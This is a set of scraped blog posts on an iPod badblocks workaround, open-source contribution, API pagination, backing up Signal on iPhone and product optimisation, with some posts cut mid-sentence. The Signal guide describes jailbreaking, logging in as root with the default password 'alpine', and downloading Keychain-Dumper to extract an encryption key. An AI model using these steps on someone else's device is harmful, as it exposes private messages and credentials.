&nbsp; <span>print</span> currentBad<br>
&nbsp; lastBad = currentBad<br>
<span>}</span></p><p>

<span>END</span> <span>{</span><br>
&nbsp; <span># Print some bad blocks after the last block</span><br>
&nbsp; <span>for</span> <span>(</span>i = lastBad<span>+</span><span>1</span> ; i <span>&lt;</span> lastBad <span>+</span> <span>(</span>gapTreshold<span>/</span><span>2</span><span>)</span>; i<span>++</span><span>)</span><br>
&nbsp; &nbsp; <span>print</span> i<br>
<span>}</span></p></div></td></tr></tbody></table></div>




<p>Setting the gapTreshold to 4000 is what eventually worked for me, and with that list as input (and around 10 iterations of badblocks where I would find a new bad block, add it to the list and re-run the script), I could run the badblocks program on the hard drive without crashing the iPod! (By the way: badblocks gets really resource hungry when you give it a large list as input!)</p>



<pre>$ awk -f fill-gaps.awk badblocks.txt &gt; badblocks-filled.txt<br>$ sudo badblocks -n -v -s -b 4096 -i badblocks-filled.txt /dev/sda # (no output)<br>$ wc -l badblocks.txt<br>10267<br>$ wc -l badblocks-filled.txt<br>943079</pre>



<p>943079 * 4k sectors is a little less than 4GB of unusable blocks, which is very much acceptable! That means I should be able to use around 75GB of my iPod’s storage instead only 18GB!</p>



<p>Next step is creating the filesystem with our new list of bad blocks as input. I was expecting this to be the most simple step. I was wrong.</p>



<p>First step is to make a partition that the filesystem can reside on. This is the default layout on the iPod, and can be created using a tool like (g)parted:</p>



<pre># fdisk -l /dev/sda<br>Disk /dev/sda: 74.4 GiB, 79824777216 bytes, 19488471 sectors<br> Units: sectors of 1 * 4096 = 4096 bytes<br> Sector size (logical/physical): 4096 bytes / 4096 …</pre></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure> <figcaption>I know you want to. - Photo by Author </figcaption></figure> <p>You might not be aware of it, but you use some form of open source software every single day.</p> <p>Every time you start an app on your phone or launch a program on your computer, you profit from the code that someone has written for free.</p> <p>WordPress, the largest and most well-known content management system, is used by <a href="https://w3techs.com/technologies/details/cm-wordpress" rel="nofollow">38% of all websites</a> worldwide. It is open source and free to use.</p> <p>Linux is powering <a href="https://w3techs.com/technologies/details/os-linux" rel="nofollow">30% of all websites</a> globally. It is open source and free to use.</p> <p>These are just two examples out of a myriad of projects which were created to solve a problem or serve a use case.</p> <p>These projects became highly popular as communities formed around them. They tried to deliver the best product possible in terms of user experience, stability, security, and more.</p> <p>But not only the usage of open source projects is rising. The participation in the open source movement as a whole is growing as well.</p> <p>According to the <a href="https://octoverse.github.com/" rel="nofollow">State of the Octoverse report</a> by GitHub, out of more than 40 million developers on GitHub, 10 million new&nbsp;users joined in 2019 alone!</p> <p>The open source movement is growing quickly and you should become a part of it too.</p> <p>Whenever I see a new update for my operating system or new software releases of tools that I actively use every day, it makes me smile. I enjoy the thought of products continuously getting better and more sophisticated.</p> <p>Do you feel the same way?</p> <p>Here is why I am convinced that you should start contributing to open source software right now.</p> <h2>You can learn a lot from the source code</h2> <p>Since the source code in open source projects is available for anyone to read, that means that a large number of developers can battle-test and improve a project.</p> <p>Developers point out privacy or security issues, update the documentation, and improve source code to the newest web development standards all the time.</p> <p>Especially when you go through the code of projects with hundreds or even thousands of contributors, you can gain immense knowledge about best practices and code quality.</p> <p>Not only is reviewing the code itself a learning experience, but also the structure and folder hierarchy in larger projects is well thought-out and works well in the long run.</p> <h2>You will work with the smartest people</h2> <p>Compared to a company that has a limited number of employees to work on feature requests and bug fixes, you have the brightest minds working in open source development.</p> <p>In my imagination, I see it as swarm intelligence, which can solve every problem that arises.</p> <p>The more people that join a community, the better a project can scale. It can be like a buzzing beehive, where you could have pull requests to a codebase from users all around the world 24/7, non-stop.</p> <p>A good example is the well-known code editor <a href="https://github.com/microsoft/vscode" rel="nofollow">Visual Studio Code</a> which got very popular with a total of 1,200+ contributors on GitHub.</p> <p>You won’t see a single day without any pull requests on GitHub and the monthly release cycles always bring out new amazing features.</p> <p>When you participate in a project and submit a pull request, you will receive extremely helpful feedback from highly experienced maintainers. You can then implement that feedback to grow as a developer.</p> <h2>Your own code could be used globally</h2> <p>Since some software development projects are used by millions of users daily, it can be very rewarding to see your own code helping so many people.</p> <p>I wrote lint rules for the JavaScript projects called <a href="https://github.com/sindresorhus/eslint-plugin-unicorn" rel="nofollow">eslint-plugin-unicorn</a> and <a href="https://github.com/sveltejs/svelte" rel="nofollow">svelte</a>. It’s a great feeling knowing that my pull request will improve the code quality of many developers all around the world.</p> <p>From my personal experience, it is also motivating to get positive feedback in the form of a thankful comment.</p> <h2>Open source projects are inclusive</h2> <p>A great advantage of free open source software is that no one is excluded from using the product because they can’t afford it.</p> <p>While some open source projects cost money to use, most do not.</p> <p>Also, when you’re contributing to a project on GitHub, many of the bigger repositories have a code of conduct. These make sure that every contributor feels welcome and accepted in a project.</p> <h2>Projects are starting to become sustainable</h2> <p>The main goal of a company is to become profitable - which often leads to questionable decisions. But open source software focuses on solving the needs of its users as the highest priority.</p> <p>Most projects are entirely volunteer-supported, and project maintainers will unfortunately never see any financial reward. But there are great ways nowadays that you can help make these projects sustainable.</p> <p>With websites like <a href="https://opencollective.com/" rel="nofollow">OpenCollective</a>&nbsp;or <a href="https://github.com/sponsors" rel="nofollow">GitHub Sponsors</a>, you can donate to speed up the development of projects that you like.</p> <p>Personally, I think that it would be great if every company donated at least a small sum to open source software projects because they profit from these tools daily. Such support would reduce the stress for a lot of maintainers and some could even take up the work full-time.</p> <h2>How to contribute to open source</h2> <p>Contributing to open source development sounds more scary than it really is. There are plenty of projects out there on GitHub which encourage first time contributors and newbies to take action by labeling issues as “Good first issue”, “Beginner friendly” or “Help wanted”.</p> <p>Don’t know where to start?</p> <p>Ask yourself: what is an application that you enjoy using every day and where you would want to give back?</p> <p>It can be as simple as searching for that application on GitHub and looking through the open issues.</p> <p>It doesn’t have to be a code contribution, either - you can also help out by creating a pull request to update the documentation, fix typos that you find, or by doing a thorough code review.</p> <p>The <code>README.md</code> file of a project usually includes a passage of how to contribute.</p> <p>If you decide to contribute to a project, I recommend reading my article about&nbsp;<a href="https://markushatvan.com/blog/contributing-to-open-source-projects-the-right-way">Contributing To Open Source Projects The Right Way</a>. It’s a detailed step-by-step guide about the contribution workflow.</p> <p>I wrote it to be very beginner friendly, so don’t worry about becoming overwhelmed. You will be able to find your first project and submit a contribution in no time!</p> <h2>Wrapping up</h2> <p>It always impressed me that everyone in the world can join an open source software project and work on it.</p> <p>And open source software only works as a collaborative effort. The goal is to produce the best product or service without compromising on important factors like stability, security, or user privacy.</p> <p>I hope you understand the importance of open source software and that you value its benefits. No matter what your reasons are for giving back to the open source community, just know that you are highly appreciated!</p> <p>Many projects can only thrive with support and contributions from developers like you.</p> <h2>Helpful resources</h2> <ul><li><a href="https://octoverse.github.com/" rel="nofollow">The State of the Octoverse</a></li> <li><a

December 26, 2020 | https://solovyov.net/blog/2020/api-pagination-design/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/api-pagination-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Returning all results for a given query could be a challenge for an API, especially if there are thousands of results. It puts a load on a server, on a client, on a network, and often is unnecessary. Thus people invented pagination.</p>
<p>The usual way to paginate is an offset or a page number. So you make a request like that:</p>
<pre><code>GET /api/products?page=10
{"items": [...100 products]}
</code></pre>
<p>and to continue you make a request like that:</p>
<pre><code>GET /api/products?page=11
{"items": [...another 100 products]}
</code></pre>
<p>In case of a simple offset it’ll look like <code>?offset=1000</code> and <code>?offset=1100</code> — it’s the same old soup, just reheated. It’ll either go straight into SQL query like <code>OFFSET 1000 LIMIT 100</code> or will be multiplied by page size (that <code>LIMIT</code> value). In any case, it’s a suboptimal solution, since every database has to skip that 1000 rows. And to skip them it needs to identify them. It does not matter if it’s PostgreSQL, or ElasticSearch, or MongoDB, it’ll have to order them, count them, and throw them away.</p>
<p>This is a kind of work which no one needs. But it repeats over and over again since it’s <em>easy</em> to implement — you directly map your API onto your query to a database.</p>
<p>What do you do then? We could look at what databases do! They have this concept, called <a href="https://en.wikipedia.org/wiki/Cursor_(databases)">cursor</a> — it’s a pointer to a row. So you can say to a database “return me 100 rows after <strong>that</strong> one”. And it’s much easier for a database to do since there is a good chance that you’ll identify the row by a field with an index. And suddenly you don’t need to fetch and skip those rows, you’ll go directly past them.</p>
<p>An example:</p>
<pre><code>GET /api/products
{"items": [...100 products],
 "cursor": "qWe"}
</code></pre>
<p>API returns an (opaque) string, which you can use then to retrieve the next page:</p>
<pre><code>GET /api/products?cursor=qWe
{"items": [...100 products],
 "cursor": "qWr"}
</code></pre>
<p>Implementation-wise there are many options. Generally, you have some ordering criteria, for example, product id. In this case, you’ll encode your product id with some reversible algorithm (let’s say <a href="https://hashids.org/">hashids</a>). And on receiving a request with the cursor you decode it and generate a query like <code>WHERE id &gt; :cursor LIMIT 100</code>.</p>
<p>Just a little performance comparison, look at how offsets work:</p>
<pre><code>=# explain analyze select id from product offset 10000 limit 100;
                                                           QUERY PLAN                                                            
---------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=1114.26..1125.40 rows=100 width=4) (actual time=39.431..39.561 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1274406.22 rows=11437243 width=4) (actual time=0.015..39.123 rows=10100 loops=1)
 Planning Time: 0.117 ms
 Execution Time: 39.589 ms
</code></pre>
<p>And how where works:</p>
<pre><code>=# explain analyze select id from product where id &gt; 10000 limit 100;
                                                          QUERY PLAN                                                          
------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=0.00..11.40 rows=100 width=4) (actual time=0.016..0.067 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1302999.32 rows=11429082 width=4) (actual time=0.015..0.052 rows=100 loops=1)
         Filter: (id &gt; 10000)
 Planning Time: 0.164 ms
 Execution Time: 0.094 ms
</code></pre>
<p>That is a difference of several orders of magnitude! Of course, the actual numbers depend on a size of a table, on your filters and on a store implementation. There <a href="https://use-the-index-luke.com/no-offset">a great article</a> with more technical information - there are slides embedded, see slide 42 for performance comparison.</p>
<p>Of course, nobody orders products by an id — you usually order them by some relevancy (and then by id as a <a href="https://stackoverflow.com/a/17330992/46854">tie breaker</a>). In the real world, you’ll have to look at your data to determine what to do. Orders can be ordered by id (as it’s monotonically increasing). Wishlist items can be ordered like that as well — by wishlisting time. In our case products come from ElasticSearch, which naturally supports this cursor stuff.</p>
<p>One deficiency you can see is that it’s impossible to generate a “previous page” link with a stateless API. So in case of a user-facing pagination, if it’s important to have prev/next and “go directly to page 10” buttons there is no way around this offset/limit stuff. But in other cases using cursor-based pagination can greatly improve performance, especially on really big tables with really deep pagination.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>I started using Signal 5 years ago as I became increasingly conscious of my data footprint. Around the same time, I closed my Facebook and Instagram accounts, and later, my Google Account.</p><h2 id="the-problem-with-signal">The problem with Signal</h2><p>Signal makes it very difficult, and in most cases, impossible, for one to back up, export, or migrate message data. The Signal team insists these restrictions are meant to protect users’ privacy. However, backup and migration policies differ for each official Signal client and sometimes contradict each other.</p><p>For example, while iOS offers no official backups process, Android backups are built into the app. At the same time, iOS users can migrate their data to a new device (as long as their phone number hasn’t changed), but this is impossible on Android. Meanwhile, decrypting messages from the desktop client is trivial, but linking one’s phone and desktop client only syncs messages forward in time.</p><h2 id="why-export-signal-s-message-history">Why export Signal's message history</h2><p>Because it’s my fucking data.</p><p>The road to exporting my data was long, frustrating and filled with dead ends – it took over a year to get here. What's paradoxical is that someone else's phone turned out to be the key to my data. </p><p>In recent years, I moved most of my conversations to Signal, including those with family and close friends. Shortly after we started dating, I asked my partner to switch to Signal, and we’ve used it exclusively ever since. At some point, I thought it would be nice to export our conversation history – a sort of time capsule of our relationship. “Easy,” I thought. I was wrong.</p><p>Since we started dating, I had switched from a OnePlus 2 to an iPhone XS Max. And since migrating from Android to iOS isn’t possible, part of our conversation history was locked on my old phone. Jailbreaking the iPhone was out of the question since my version of iOS had not been jailbreaken. The Signal Desktop client could have offered an easy avenue to decrypt our chat history, but there was a period of several months during which I had not linked my iPhone to the Signal desktop client.</p><p>I opened a <a href="https://community.signalusers.org/t/ios-backups-through-the-desktop-client/8123">thread about this in the Signal Community Forum</a> in June of 2019. It quickly became apparent that backing up my Signal data would be an uphill battle. </p><p>Luckily, my partner had an iPhone 7, which she recently replaced with a company phone. Her old iPhone contained our entire message history in one place and was easy to jailbreak. Jackpot.</p><p>One important lesson I learned during this process:<strong> to ensure access to your conversation history, install the Desktop client and link it to your mobile device as soon as you start using Signal. </strong>The Signal database and encryption key are both accessible on your computer, allowing for easy decryption. Linking the desktop client later will only sync messages forward in time from the moment the devices are linked.</p><h2 id="tips-to-increase-your-chances-of-exporting-your-signal-database">Tips to increase your chances of exporting your Signal database</h2><p>If you haven’t linked the desktop client and extracting the iOS database is your only option, this guide is for you. If you've decided to embark upon this journey, here's some advice. </p><h3 id="stop-updating-ios">Stop updating iOS</h3><p>Your best chance of jailbreaking iOS is on older firmware versions. Turn off automatic updates and decline prompts to update iOS.</p><h3 id="backup-shsh-blobs-with-every-new-ios-update">Backup SHSH blobs with every new iOS update</h3><p><a href="https://en.wikipedia.org/wiki/SHSH_blob">SHSH blobs</a> are the digital signatures that Apple generates and uses to personalize iOS firmware files for each iOS device. Apple only signs firmware updates for a limited time after release. Having these signatures handy allows one to install versions of iOS after Apple stops signing them – like when a jailbreak becomes available for that version. In some cases, you may be able to downgrade iOS to a previous version.</p><p>Backup SHSH blobs every time Apple releases a new version of iOS (e.g., 14.0, 14.1, 14.1.1). I personally use the <a href="https://github.com/airsquared/blobsaver">blobsaver</a> app, but <a href="https://tsssaver.1conan.com/v2/">TSS Saver</a> is a popular alternative.</p><h3 id="learn-about-jailbreaking-and-stay-up-to-date-on-developments">Learn about jailbreaking and stay up to date on developments</h3><p>Developers and hackers are constantly working to break the security of iOS, and new methods to jailbreak iPhones are frequently made public. Stay informed on jailbreak releases by following the <a href="https://www.reddit.com/r/jailbreak/">/r/jailbreak subreddit</a>.</p><p>This <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">exhaustive list of jailbreak compatibility</a> by device and iOS version is also a great resource.</p><p>It's also useful to understand the difference between <a href="https://www.theiphonewiki.com/wiki/Untethered_jailbreak">untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-untethered_jailbreak">semi-untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-tethered_jailbreak">semi-tethered</a>, and <a href="https://www.theiphonewiki.com/wiki/Tethered_jailbreak">tethered</a> jailbreaks.</p><h3 id="recognize-that-this-may-not-work">Recognize that this may not work</h3><p>Depending on your iPhone, you might never be able to jailbreak it or extract Signals decryption key from the iOS Keychain. Apple is making it increasingly difficult to jailbreak iOS devices – improvements to hardware and software are leaving fewer cracks for hackers to exploit.</p><p>Ok, let's get our hands dirty. </p><h2 id="how-to-maybe-backup-signal-for-iphone">How to (maybe) backup Signal for iPhone </h2><p>This guide explains how I was able to backup and extract data from Signal's encrypted SQLite database on an iPhone 7 with iOS 13.6.1. </p><h3 id="prerequisites">Prerequisites </h3><ul><li>Physical access to the iPhone with Signal still installed</li><li>An original iPhone cable</li><li>A Mac or Linux computer</li><li>Patience and a bit of luck</li></ul><p>Shell environments will be differentiated as such. </p><pre><code>// Host machine
$ &lt;command&gt;

// iPhone 
root# &lt;command&gt;</code></pre><h3 id="step-1-jailbreak-ios">Step 1: Jailbreak iOS</h3><p>For iOS 13.6.1 on an iPhone 7, I used <strong>checkra1n</strong> which offers a straight forward semi-tethered jailbreak. Depending on the iPhone device and version of iOS, a jailbreak may or may not be available. </p><p>See this <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">updated list of iOS jailbreaks</a> for device compatibility and instructions. </p><h3 id="step-2-ssh-into-the-iphone">Step 2: SSH into the iPhone </h3><p>Cydia usually comes with OpenSSH installed and enabled, allowing shell access over IP or USB. If SSH access isn't activated, launch Cydia and install OpenSSH. </p><p><strong>As always, the root password on iOS is <code>alpine</code>.</strong></p><p>If the iPhone and the host machine are on the same network, SSH into the phone using its IP address. It may be found in the phone's WiFi settings. </p><pre><code>$ ssh root@[iphone ip] -p 22</code></pre><p>If SSH over the air isn't possible, USB may be an alternative. However, this involves enabling a proxy service on the host machine.</p><p>First, install <em><em>libimobiledevice</em></em> on the host machine. </p><pre><code>$ brew install libimobiledevice</code></pre><p>Then, edit <em><em>com.usbmux.iproxy.plist</em></em> and append the following XML to the file. </p><pre><code>$ nano ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.usbmux.iproxy&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/usr/local/bin/iproxy&lt;/string&gt;
&lt;string&gt;2222&lt;/string&gt;
&lt;string&gt;22&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;</code></pre><p>And finally, launch the proxy on the host machine. </p><pre><code>$ launchctl load ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><p>It should now be possible to SSH into the iPhone over USB on port <code>2222</code>.</p><pre><code>$ ssh root@localhost -p 2222</code></pre><h3 id="step-3-install-required-packages">Step 3: Install required packages </h3><p>Once logged into to the iPhone's shell, install the following packages as they will come in handy. </p><pre><code>root# apt install zip unzip nano wget</code></pre><h3 id="step-4-backup-the-signal-data-directory">Step 4: Backup the Signal data directory</h3><p><strong>Locate Signal's data directory</strong></p><p>Much like macOS, iOS stores application data in a <em>Library</em>-like directory. In iOS&nbsp;13, its located here <code>/private/var/mobile/Containers/Shared/AppGroup/</code>. </p><p>Signal's data directory contains the encrypted SQLite database file in <code>./grdb/signal.sqilte</code> and attachments, such as images and videos in <code>./Attachments</code>.</p><p>The data directory may be found by searching the filesystem for Signal's encrypted database file, <code>signal.sqlite</code>.</p><pre><code>root# find / -type f -iname "signal.sqlite"</code></pre><p>That should return something which looks like this:<br><code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/grdb/signal.sqlite</code> </p><p>The Signal directory is: <code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></p><p><strong>Zip the Signal directory</strong></p><p>It is recommended to zip the entire directory, not only the database file, as it also contains images and other message attachments. This archive can reach several gigabytes.</p><pre><code>root# cd /private/var/mobile/Containers/Shared/AppGroup/
root# zip -r signal-backup.zip &lt;Signal directory&gt;

# ex: zip -r signal-backup.zip /private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></pre><p><strong>Retrieve the backup on the host machine</strong></p><p>In a new terminal session on the host machine, use <code>scp</code> to copy the backup. </p><pre><code>$ scp -P 22 root@localhost:/private/var/mobile/Containers/Shared/AppGroup/signal-backup.zip ~/</code></pre><p>Once complete, verify that the backup has fully transferred by unpacking it.</p><p>This is the most complex part of this operation and it helps to have a basic understanding of core iOS development concepts.</p><p><strong>Understanding iOS Entitlements </strong></p><p>From the <a href="https://developer.apple.com/documentation/bundleresources/entitlements">Apple Developer Documentation</a>: </p><blockquote>An entitlement is a right or privilege that grants an executable particular capabilities. For example, an app needs the HomeKit Entitlement — along with explicit user consent — to access a user’s home automation network. An app stores its entitlements as key-value pairs embedded in the code signature of its binary executable.</blockquote><p><strong>Enter Keychain Dumper</strong></p><p>We will use <a href="https://github.com/ptoomey3/Keychain-Dumper"><strong>Keychain-Dumper</strong></a> to attempt extracting the Signal encryption key. It requires entitlements to access Keychain data for any particular app. </p><p>Reading through Keychain-Dumper's GitHub issues, I learned that entitlements changed in iOS 13.5 – prior to this version, an application <a href="https://github.com/ptoomey3/Keychain-Dumper/issues/52#issuecomment-638174691">could be given wildcard entitlements</a>. Changes in 13.5 made it such that apps need specific entitlements. Thankfully, it's possible to update an executable's entitlements, even as a binary.</p><p>The <code>keychain_dumper</code> binary included in its <a href="https://github.com/ptoomey3/Keychain-Dumper">GitHub repo</a> has wildcard entitlements. We'll need to update them in order to give it permission to decrypt the Signal key.</p><p><strong>Install Keychain Dumper on the iPhone</strong></p><p>Back on the iPhone, download and extract the <a href="https://github.com/ptoomey3/Keychain-Dumper/releases/tag/1.0.0">keychain_dumper binary</a>, and move it to <code>/usr/bin</code>.</p><pre><code>root# wget https://github.com/ptoomey3/Keychain-Dumper/releases/download/1.0.0/keychain_dumper-1.0.0.zip

It certainly would have made it easier to build the company according to his vision rather than something that needed to please the shareholders that needed an IPO to get a return.</p><p>In the early days you had the GOATS like Reid Hoffman (founder LinkedIn), Max Levchin (Paypal and Affirm), and the likes answering questions. Now it’s some 14yr old telling you about the opportunity of a lifetime: screencasting stories from Reddit, having the speech to text tool read them, turn it into a video and put it on YouTube. And then…? Millions I guess?</p><p>It went from THE place to get high-quality courses from knowledgeable instructors to the flea-market of cheap knock-offs and fake guru business opportunity courses. While you can find quality courses there, the overall quality has badly degraded. The best instructors aren’t incentivized to create a course because your $1000 course containing 3 decades of experience will sell for $9.99 of which you’ll get $2.50. So if you actually have something to offer, you’ll go somewhere else, leaving mainly the type of people that game the system in order to make a quick buck.</p><p>People used to LOVE Facebook with a vengeance. Now I have 80 notifications, 40 of which are new friend suggestions of people I’ve never met, 20 are strangers that sent out a blast to get likes for their new page, 17 are events, and 3 are birthdays. [2]</p><p>Oh yeah… and not 1 is actually relevant to me.&nbsp;You can fool a user only so many times before you’ve essentially trained them to ignore you.</p><p><em>They started implementing the same dark patterns with their DM. You get notifications for being friends for a certain time and when you accept a new friend.</em></p><p>In its search for endless optimization, the platform has become bloated and just plain annoying. I can’t think of a single person in my cohort (and younger cohorts) that use FB as much or more as 10 years ago.&nbsp;</p><p>The current demographic appears to be the same type of people that use Bing over Google, or Explorer over Chrome. Late adopters that are sticky to defaults.</p><p>So be careful when optimizing. Remember the quantification bias! </p><p><em>Discussed in </em><a href="https://www.younglingfeynman.com/essays/paradigm"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a></p><p>Just because something is easy to measure doesn’t mean it’s insightful. Just because something can’t be measured easily doesn’t mean it isn’t.</p><p>Remember that business is part art part science: <a href="https://www.younglingfeynman.com/essays/artofbusiness" target="_blank">The Art Of Business, Where Science And Business Depart</a>.</p><p>[1]  I <a href="https://www.younglingfeynman.com/essays/comedy">made the point before</a> when it comes to certain areas that are sufficiently complex (e.g. statistics, data science, economics), you either want no one or a person with extraordinarily deep expertise. </p><p>Interesting piece on the fraud that’s going on in Data Science: <a href="https://logicmag.io/intelligence/interview-with-an-anonymous-data-scientist/"><em>The Smart, the Stupid, and the Catastrophically Scary: An Interview with an Anonymous Data Scientist</em></a></p><p>What you don’t want is someone that knows enough to bullshit you but not enough to get it right. An indicator that you might have the right person is the phrase: ‘‘I’m not sure’’ or ‘‘ it depends on…’’. In these fields, the vast majority of so-called experts add no value at best or negative value at worst.</p><p>[2] This is what I admired so much about Systrom’s and Krieger’s Instagram. Their almost zen-like essentialism. No bloating, no fluff, trying very hard to take away things as they did about adding things. How many new features did they launch in a month before their Facebook acquisition? How many new features does IG launch now per month? </p><p>I’m not saying adding new features is bad. I’m also not saying that a company shouldn’t scale. The point I’m making is that entropy is real. It’s much easier for your product to become worse, than it is to become better. So if that’s not a core focus, it probably won’t happen by accident.</p><p>But scale and improvements in user love (which follow from a better service/product) are not mutually exclusive. Apple provides a data point. Especially during the Jobs reign. </p><p><em>More on this in the essay series: </em><a href="https://www.younglingfeynman.com/essays/deeplove"><em>Do You Have Customers Who Deeply Love You?</em></a><em> </em></p></div></div></div>]]>
